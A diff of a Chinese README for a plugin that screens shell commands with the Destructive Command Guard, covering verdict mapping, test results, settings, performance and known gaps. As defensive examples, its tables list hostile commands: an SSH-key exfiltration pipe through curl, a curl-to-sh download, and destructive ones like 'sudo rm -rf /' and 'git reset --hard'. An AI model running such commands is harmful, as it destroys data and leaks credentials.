@@ -1,162 +1,161 @@
-# Shell 守卫
+# Shell 守卫：行为细节
 
-把 [Destructive Command Guard](https://github.com/Dicklesworthstone/destructive_command_guard)（`dcg`）插进 DSH 的工具审核链路：**每条 shell 命令在执行前先用 dcg 判一次**，被拒绝的命令根本不会跑到 body。
+安装与配置分别见 [AI-INSTALL.md](AI-INSTALL.md) 与 [CONFIG.md](CONFIG.md)。本文说明插件在运行时的行为、验证结果与边界。
 
-开关默认**关闭**。关着的时候插件不注册任何监听，行为和你没装它完全一致。
+## 工作方式
 
-## 它做什么
+- 在 `tools/pre-execute` 最早阶段注册，取出待执行工具的命令字符串；
+- 调用 `dcg --robot test --stdin --format json --dialect <posix|ps> --config <policy.toml>`，命令经 stdin 传入；
+- 按 `dcg` 返回的 `decision` 决定放行、转交审批或拒绝；
+- 每次判定写入一行审计记录。
 
-- 在 `tools/pre-execute` 上抢在最前面，取出待执行工具的命令字符串；
-- 调 `dcg --robot test --stdin --format json`，把命令从 stdin 喂进去，拿回结构化判定；
-- 按判定决定放行、拒绝，或者把决定权交回审批流程；
-- 每次判定写一行审计，方便事后回答"昨天它拦了什么"。
+覆盖工具默认 `bash`、`pwsh`、`ops_bash`、`ssh_exec`，由 `tools` 调整。前两个由 DSH 自带，`ops_bash` 来自 `dsh-ops`，`ssh_exec` 来自 `@linxin666/dsh-ssh`。命令取自工具参数中的 `command` 字段；仅提供 `script_path` 时读取该文件内容（上限 256 KiB，含 NUL 字节、超限或空文件一律拒绝）后再判定。
 
-覆盖的工具默认是：`ops_bash`、`bash`、`pwsh`、`ssh_exec`。用 `tools` 配置项可以增删。
+`--dialect` 按工具选择：POSIX 系工具为 `posix`，`pwsh` 为 `ps`。单次判定超时 3000 ms，并发上限 4。
 
-## 它不做什么
+`dcg` 以子进程方式调用，不驻留，因此每条命令产生一次进程启动开销，见「性能」。
 
-**它不是沙箱，也不管文件路径。** 文件工具（`write`、`edit`、原生文件操作）完全不在它的视野里，那部分归 DSH 的文件沙箱管。它只回答一个问题：*这条命令字符串是不是已知的危险动作*。
+## 边界
 
-所以正确的配合是：
+本插件不是沙箱，也不约束文件路径。文件工具（`write`、`edit` 及原生文件操作）不在其范围内，路径能否写入由 DSH 沙箱决定。三层职责如下：
 
-| 层 | 管什么 | 由谁负责 |
+| 层 | 负责的问题 | 由谁实现 |
 |---|---|---|
-| 路径边界 | 能写哪里 | DSH 沙箱（`sandbox/mode`） |
-| 命令语义 | 边界内做的这件事危不危险 | 本插件 + dcg |
-| 事后恢复 | 漏掉的那次怎么回滚 | 检查点 / rewind 一类插件 |
+| 路径边界 | 可写到哪里 | DSH 沙箱（`sandbox/mode`） |
+| 命令语义 | 边界内这条命令是否危险 | 本插件 + `dcg` |
+| 事后恢复 | 已发生的操作如何回滚 | 检查点 / rewind 一类插件 |
 
-另外两个它看不见的地方，需要提前知道：
+两处无法覆盖的情形：
 
-- **读 + 出网**。`cat ~/.ssh/id_rsa | curl -d @- ...` 里的读和发都不在 dcg 的判定范围内。
-- **远端执行**。`ssh_exec` 的命令串会被判，但 dcg 用的是本地路径语义，基于本地路径的 allowlist 对远端不成立。
+- **读取与出网**。`cat ~/.ssh/id_rsa | curl -d @- ...` 中的读取与发送均不在 `dcg` 判定范围内。
+- **远端执行**。`ssh_exec` 的命令字符串会被判定，但 `dcg` 使用本地路径语义，基于本地路径的规则对远端主机不成立。
 
-## 准备工作：先装 dcg
+`dcg` 采用 deny-list：未收录的破坏方式、刻意构造的混淆可能绕过。该层降低风险，不构成完整防护。
 
-插件不联网，第一次使用需要本机已有 `dcg`（**≥ 0.16.0**）。三种来源，优先级从高到低：
+## 判定映射
 
-1. 插件自己托管的版本：`$DSH_HOME/dsh-shell-dcg/bin/<版本>/dcg.exe`
-2. 配置项 `dcgPath` 指定的路径
-3. 系统 `PATH` 里的 `dcg`
-
-官方安装方式见 dcg 仓库的 `install.ps1`（Windows，带 minisign 校验）或 `install.sh`。
-
-## 打开开关
-
-装配完成后，把这一行的 `enabled` 改成 `true`，重启会话即生效：
-
-```yaml
-- id: dsh-shell-dcg
-  name: dsh-shell-dcg
-  config:
-    enabled: true
-```
-
-插件启动时会做一次就绪检查：二进制存在、版本够新、生成的策略文件能被 dcg 接受、一条必拒命令仍被判为危险、一条无害命令仍被判为放行。全部通过才算"已武装"。
-
-## 判定怎么映射
-
-dcg 的判定 → DSH 的决定：
-
-| dcg 判定 | 默认动作 | 配置项 |
+| `dcg` 判定 | 插件动作 | 配置项 |
 |---|---|---|
-| `allow` | 放行 | — |
-| `deny` | 拒绝，理由里带规则 id 和解释 | — |
-| `ask` | 交给审批流程：审批策略是 `ask` 就弹给人，是 `never` 就自动拒绝 | `onAsk` |
-| `warn` / `log` | 放行（仍记审计） | `onWarn` |
-| `indeterminate` | 拒绝（分析没做完，不能当放行） | `failClosed` |
-| 未知的新判定词 | 拒绝 | `failClosed` |
-| dcg 超时 / 崩溃 / 输出不是 JSON | 拒绝 | `failClosed` |
-| dcg 拒绝加载策略（`configuration_error`） | 拒绝，且不受 `failClosed` 影响 | — |
+| `allow` | 执行 | — |
+| `deny` | 拒绝，理由含 `rule_id` 与 `dcg` 给出的说明 | `dcg` 策略 |
+| `ask` | 转交 DSH 审批流程 | `onAsk` |
+| `warn` / `log` | 执行并记录 | `onWarn` |
+| `indeterminate` | 拒绝 | `failClosed` |
+| 未知判定词 | 拒绝 | `failClosed` |
+| 超时 / 崩溃 / 非 JSON | 拒绝 | `failClosed` |
+| 策略加载失败（`configuration_error`） | 拒绝 | 不受 `failClosed` 影响 |
 
-**未知判定词默认拒绝**是刻意的：dcg 以后新增判定词时，插件必须先"不懂就拦"，而不是把它当成放行。
+无法判定时默认拒绝，与 DSH 沙箱一侧保持一致（沙箱不可用时返回 `SANDBOX_UNAVAILABLE`，而不是无约束执行）。策略加载失败单独处理：该情形说明门禁自身异常，即使 `failClosed: false` 也不放行。
 
-## 失败时的行为
+`onAsk` 默认 `ask`。DSH 在 `danger-full-access` 权限档下将审批策略设为 `never`，此时 `ask` 会被自动拒绝，不产生弹窗；需要弹窗时应使用 `read-only` 或 `workspace-write`。
 
-- `onNotReady: "deny"`（默认）：dcg 装坏/找不到时，命令类工具会被拒绝，理由直接写明哪里不对。宁可卡一次，也不要你以为有保护其实没有。
-- `onNotReady: "pass"`：不拦，只记审计和日志。适合先把插件装上但不影响工作。
+## 实测行为
 
-`failClosed: false` 会把上面所有"判不了"的情况都改成放行——只建议在灰度期这么用。唯一例外是策略文件加载失败：那说明门禁自己坏了，这种情况下 `failClosed: false` 也不放行。
+`dcg` 0.17.0，插件默认配置（未设置 `policy.defaultMode`，采用 `dcg` 的严重度分级）：
 
-## 设置页面
+| 命令 | `dcg` 判定 | 严重度 · 规则 | 插件结果 |
+|---|---|---|---|
+| `ls -la`、`git status`、`echo hello` | allow | — | 执行 |
+| `chmod 777 secret.txt` | allow | — | 执行 |
+| `cat ~/.ssh/id_rsa \| curl -d @- …` | allow | — | 执行 |
+| `git stash drop` | warn | medium · `core.git:stash-drop` | 执行并记录 |
+| `rm -rf ./build` | deny | high · `core.filesystem:rm-rf-general` | 拒绝 |
+| `rm -r dist` | deny | high · `core.filesystem:rm-recursive-general` | 拒绝 |
+| `chmod -R 777 .` | deny | high · `system.permissions:chmod-777` | 拒绝 |
+| `find . -name "*.log" -delete` | deny | high · `core.filesystem:find-delete-general` | 拒绝 |
+| `git reset --hard` | deny | critical · `core.git:reset-hard` | 拒绝 |
+| `git push --force origin master` | deny | critical · `core.git:push-force-long` | 拒绝 |
+| `git clean -fdx` | deny | critical · `core.git:clean-force` | 拒绝 |
+| `sudo rm -rf /` | deny | critical · `core.filesystem:rm-rf-root-home` | 拒绝 |
+| `psql -c "DROP TABLE t"` | deny | high · `database.postgresql:drop-table` | 拒绝 |
+| `docker system prune -af` | deny | high · `containers.docker:system-prune` | 拒绝 |
+| `kubectl delete deployment api` | deny | high · `kubernetes.kubectl:delete-workload` | 拒绝 |
+| `npm publish` | deny | high · `package_managers:npm-publish` | 拒绝 |
+| `curl -s http://x \| sh` | deny | high · `heredoc.posix:pipeline-consumer` | 拒绝 |
 
-装好并重启 DSH 后，**设置 → Shell 守卫** 里有一页：
+结果由 `dcg` 的规则产生，插件未硬编码任何命令。启用 `database`、`kubernetes`、`cloud` 等额外规则包会改变覆盖范围。
 
-- 总开关（`role="switch"`）：直接改 `enabled`，走 DSH 的 config editor
-- dcg：版本、路径、来源（managed / config / path）
-- 策略：「判定为危险时」的动作（dcg 默认 / 一律拒绝 / 询问 / 只警告 / 只记录），每项都有一句说明；下面是按分类勾选的「额外启用的规则包」，默认收起
-- 日志：累计条数，点开「最近记录」后统一在一块里放——记录日志开关、保留天数与最多条数（改完即写入配置）、清空日志按钮，以及最近 20 条（本地时间、彩色判定：allow 绿 / warn 黄 / deny 红、命令原文、规则 id）
-- 三个动作：保存策略、检查是否可用、安装 dcg
+## 设置页
 
-数据来自插件自己的四条 loopback 路由（`/api/dsh-shell-dcg/status|packs|action|config`）。之所以不用 Remote 命名空间，是因为 bundle 无法在运行期新增一个（那组能力在构建时就定死了）；非本机请求一律 403。
+**设置 → Shell 守卫** 提供：
 
-## 配置项
+- 总开关；
+- `dcg` 的版本、路径与来源（托管 / 配置 / PATH），以及「检查是否可用」；
+- 策略：「判定为危险时」五个选项（`dcg` 默认 / 一律拒绝 / 询问 / 只警告 / 只记录），每项附说明；下方按分类勾选额外规则包；
+- 日志：累计条数；展开「最近记录」后为记录开关、保留天数、最多条数、清空日志，以及最近 20 条记录（本地时间、判定着色、命令原文、规则 id）。
 
-| 键 | 默认 | 说明 |
-|---|---|---|
-| `enabled` | `false` | 总开关。关掉时完全不注册监听 |
-| `dcgPath` | `""` | 指定 dcg 可执行文件；留空则按托管目录 / PATH 查找 |
-| `preferManaged` | `true` | 托管版本优先于 `dcgPath` |
-| `minVersion` | `"0.16.0"` | 低于此版本视为未就绪 |
-| `agentName` | `"dsh"` | 传给 `dcg --agent`，对应策略里的 `[agents.dsh]` |
-| `tools` | `["ops_bash","bash","pwsh","ssh_exec"]` | 参与判定的工具名 |
-| `commandField` | `"command"` | 从工具参数里取命令的字段名 |
-| `scriptPath` | `"read"` | 只给 `script_path` 时：`read` 读出文件内容交给 dcg 判 / `deny` 直接拒 / `pass` 放行不审 |
-| `workdirField` | `"workdir"` | 解析相对脚本路径时用哪个参数当 cwd |
-| `dialects` | 按工具名映射 | `ops_bash`/`bash`/`ssh_exec` → `posix`，`pwsh` → `ps` |
-| `onAsk` | `"ask"` | `ask` / `deny` / `allow` |
-| `onWarn` | `"allow"` | `allow` / `ask` / `deny` |
-| `failClosed` | `true` | 判不了时是否拒绝 |
-| `onNotReady` | `"deny"` | 未就绪时是否拒绝命令类工具 |
-| `dryRun` | `false` | 只记录不拦（灰度用） |
-| `timeoutMs` | `3000` | 单次判定预算 |
-| `maxConcurrent` | `4` | 并发判定上限，防止批量调用 fork 风暴 |
-| `policy.packs` | `[]` | 额外启用的包，写进 `[packs] enabled`。这是**增量**的：dcg 自带的包集合照旧生效，`core.*` 始终在保护范围内 |
-| `policy.defaultMode` | `""` | 写进 `[policy] default_mode`，取值 `deny`/`ask`/`warn`/`log`。**留空表示不写**，交给 dcg 的严重度分级 |
-| `policy.observeUntil` | `""` | 写进 `policy.observe_until`，即 dcg 内建的灰度到期日 |
-| `policy.packModes` | `{}` | 单包降级，例如 `{ "core.git": "warn" }` |
-| `audit.enabled` | `true` | 是否写判定记录 |
-| `audit.keepCommandText` | `true` | 记录命令原文；关掉则只存哈希 |
-| `audit.commandMaxChars` | `300` | 命令原文的截断长度 |
-| `audit.retentionDays` | `30` | 保留天数 |
-| `audit.retentionEntries` | `500` | 最多保留条数；超过任一上限就从最旧的记录删起 |
+页面修改通过 DSH 的 config editor 写回 profile 配置，与手写 `cordis.patch.yml` 等价，需重启生效。`policy.packModes`、`policy.observeUntil`、`dryRun`、`maxConcurrent` 未提供界面入口。
 
-## 安装 dcg
+页面数据来自插件挂载的四条 loopback 路由（`/api/dsh-shell-dcg/status|packs|action|config`），非本机请求返回 403。使用自有路由而非 Remote 命名空间，原因是 bundle 无法在运行期新增 Remote 命名空间。
 
-插件不打包二进制。三条路：dcg 官方安装脚本、自己编译、或者用本插件自带的安装脚本：
+## 性能
 
-```sh
-npm run install-dcg
+单次判定的完整开销（进程启动 + `dcg` 评估），每条命令 100 次：
+
+| 命令 | 最小 | 中位数 | p90 | 最大 |
+|---|---|---|---|---|
+| `ls -la`（allow） | 24.4 ms | 26.3 ms | 33.3 ms | 38.9 ms |
+| `rm -rf ./build`（deny） | 25.7 ms | 27.0 ms | 33.8 ms | 36.6 ms |
+| `git reset --hard`（deny） | 32.1 ms | 33.5 ms | 36.4 ms | 50.5 ms |
+
+该成本主要来自 `dcg` 自身启动。批量调用受 `maxConcurrent`（默认 4）约束，不会形成并发进程风暴。
+
+## 常见问题
+
+**拒绝理由出现 `SHELL_DCG_NOT_READY`**
+`dcg` 未就绪。理由中会指出未通过项：二进制缺失、版本过低或探针失败。修复后重试；需临时恢复工作可关闭 `enabled`。
+
+**误报过多**
+按规则包降级：`policy.packModes: { "core.git": "warn" }`。
+单条放行：命令被拒时 `dcg` 会给出 `allow-once` 码，在终端执行 `dcg allow-once <码>`。
+
+**希望先观察一段时间**
+设置 `policy.defaultMode: log`（或 `dryRun: true`），全部放行并保留记录。
+
+**终端中的 dcg 与 DSH 中的判定不一致**
+设计如此。插件通过 `--config` 指向自动生成的 `generated\policy.toml`；终端直接运行 `dcg` 读取用户配置（Windows 为 `%USERPROFILE%\.config\dcg\config.toml`）。两者互不影响。若需一致，将包列表写入 `policy.packs`。
+
+**启用后没有任何判定记录**
+`enabled` 默认为 `false`；本地目录安装修改代码后需重装或重启。
+
+**「安装 dcg」在企业网络下失败**
+TLS 拦截所致。手动下载 `dcg` 的 release 资产并解包，再用 `dcgPath` 指定。
+
+## 磁盘上的东西
+
+```
+%DSH_HOME%\dsh-shell-dcg\
+  bin\<版本>\dcg.exe        托管安装的二进制（可选）
+  generated\policy.toml     由配置生成的策略，每次启动重写，勿手改
+  audit\YYYY-MM-DD.jsonl    每日判定记录
 ```
 
-它只认 `lib/install.js` 里写死的版本与 SHA-256（当前 0.17.0）。下载后先算摘要，对不上就丢弃，绝不落盘执行——所以升级 dcg 是改这张表、重新发版的动作，而不是运行时跟随上游最新。
+## 卸载
 
-- 下载预算 5 分钟，超时立刻报错并提示手动下载，不会挂着不动
-- Windows 解包走内置 ZIP 读取器；Linux / macOS 是 `.tar.xz`，用系统 `tar` 解
-- 装好的二进制在 `bin/<版本>/`，查找顺序里排在 `dcgPath` 与 PATH 之前
-
-## 关于 dcg 的几点实测结论
-
-**不设 `default_mode` 时，dcg 按严重度分级。** 规则命中后：`critical`/`high` 拒绝、`medium` 警告后放行、`low` 只记日志。插件只在 `policy.defaultMode` 明确配置时才写这一行——把模式定死会把三级压成同一个答案，那才是"模棱两可"的来源。
-
-**终端和会话用的不是同一份配置。** 插件用 `--config` 指定自己生成的策略文件；你在终端直接跑 `dcg` 时读的是 `~/.config/dcg/config.toml`。两边的包集合与 `default_mode` 互不影响，想让会话和终端一致，就把包列表写进 `policy.packs`。
-
-**包是增量的。** `[packs] enabled` 只追加，`core.*` 始终生效；dcg 另有 `[packs] disabled` 可关掉非 core 的包，本插件暂未暴露这个开关。
-
-## 磁盘上有什么
+在 Plugins 页面移除，或：
 
 ```
-$DSH_HOME/dsh-shell-dcg/
-  bin/<版本>/dcg.exe        托管安装的二进制（可选）
-  generated/policy.toml     由配置生成的 dcg 策略，勿手改
-  audit/YYYY-MM-DD.jsonl    每日判定记录
+plugin_manager { action: "remove_bundle", target: "dsh-shell-dcg" }
 ```
 
-策略文件通过 `--config` 传给 dcg，所以**终端里直接跑 `dcg` 仍然用你自己的 `~/.config/dcg/config.toml`**，两边的策略互不干扰。
+`%DSH_HOME%\dsh-shell-dcg\` 可保留（策略与审计记录）或删除。
+
+## 关于 dcg
+
+**不设 `default_mode` 时按严重度分级。** 规则命中后：`critical` / `high` 拒绝、`medium` 警告后放行、`low` 仅记录。插件只在 `policy.defaultMode` 明确配置时才写这一行。
+
+**包是增量的。** `[packs] enabled` 只追加，`core.*` 始终生效；`dcg` 另有 `[packs] disabled` 用于关闭非 core 包，本插件未暴露该开关。
+
+**安装只接受钉住的版本。** 版本与各平台 SHA-256 写在 `lib/install.js`（当前 0.17.0），摘要不匹配即丢弃；升级需更新该表并重新发版。
 
 ## 已知限制
 
-- 只判命令字符串。`script_path` 形式会把文件内容读出来再判，上限 256 KB，且必须是可读的 shell 文本：含 NUL 字节、超限、空文件一律拒绝。
-- 读文件与 bash 真正执行之间有一个极短的时间窗，脚本在这期间被改写的话判定结果会过期。
-- 不判文件工具，不做路径约束。
-- dcg 是 deny-list：没被收录的新型破坏写法可能漏过，它也会被刻意构造的混淆绕过。它是减速带，不是保险柜。
-- 判定记录默认保存命令原文（超过 `audit.commandMaxChars` 截断）；只想留指纹就关掉 `audit.keepCommandText`。
+- **仅判命令字符串。** `script_path` 形式会读取文件内容后判定，上限 256 KiB。
+- **存在时间窗。** 读取脚本内容与实际执行之间，若文件被改写，判定结果可能过期。
+- **不判文件工具，不做路径约束。**
+- **`dcg` 采用 deny-list。** 未收录的破坏方式、刻意构造的混淆可能绕过。
+- **命令拼接由 `dcg` 解析。** 其无法解析的形式返回 `indeterminate`，本插件按拒绝处理，复杂单行命令可能被误拦。
+- **未在 macOS 与 Linux 上实测。**
+- **摘要未逐平台核对。** `lib/install.js` 中的 SHA-256 取自 release 的 `SHA256SUMS`，除当前使用平台外未逐一校验。
+- **无版本更新提醒。** `minVersion` 只拦截过低版本。
+- **审计记录默认保存命令原文。** 需要时关闭 `audit.keepCommandText`。
